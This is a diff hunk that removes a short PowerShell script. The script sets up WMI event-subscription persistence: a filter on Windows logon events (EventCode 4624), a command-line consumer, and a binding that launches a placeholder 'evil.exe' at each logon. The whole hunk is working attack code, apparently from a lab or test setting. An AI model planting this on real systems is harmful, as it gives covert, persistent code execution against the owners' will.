@@ -1,7 +1,0 @@
-$filterName = 'LogonEvents'
-$consumerName = 'LogonHandler'
-$Query = "Select * from __InstanceCreationEvent where TargetInstance ISA 'Win32_NTLogEvent' and TargetInstance.EventCode = '4624'"
-$exepath = 'c:\users\ieuser\desktop\evil.exe'
-$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
-$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Argument @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
-Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} 
